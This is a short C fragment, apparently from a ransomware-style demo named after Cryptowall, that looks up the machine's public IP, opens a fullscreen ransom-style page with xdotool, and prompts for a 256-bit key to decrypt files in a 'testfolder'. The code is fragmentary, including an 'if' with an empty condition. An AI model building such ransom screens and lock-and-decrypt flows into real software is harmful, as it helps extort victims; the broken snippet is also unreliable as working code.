// Get IP Linux
system("dig @resolver1.opendns.com A myip.opendns.com +short -4 > ip");

// Detach and sendkey Linux
  system("firefox -new-window cryptowall/index.htm &");
  sleep(2);
  system("xdotool key Alt+Tab");
  sleep(1);
  system("xdotool key F11");

if () {
  printf("\n");
  uint8_t key[32];
  char digit1, digit2;
  printf("Enter the key (64 hexadecimal digits):\n");
  for (uint8_t i = 0; i < 32; i++) {
    do {
      digit1 = getchar();
    } while (digit1 == ' ' || digit1 == '\n');
    do {
      digit2 = getchar();
    } while (digit2 == ' ' || digit2 == '\n');
    key[i] = chartohex(digit1) * 16 + chartohex(digit2);
  }
  printf("\nKey:\n");
  PrintHex(key, 32);
  printf("\n");

  char c;
  do {
    c = getchar();
  } while (c != '\n' && c != EOF);

  printf("Are you sure you wanna decrypt?\nA wrong key will make your files unrecoverable forever");
  printf(" (Y/n): ");
  char opt;
  scanf("%c", &opt);
  if (opt == 'Y' || opt == 'y')
    SearchFiles("testfolder", key);
  printf("%u files has been decrypted\n", cant_files);
}
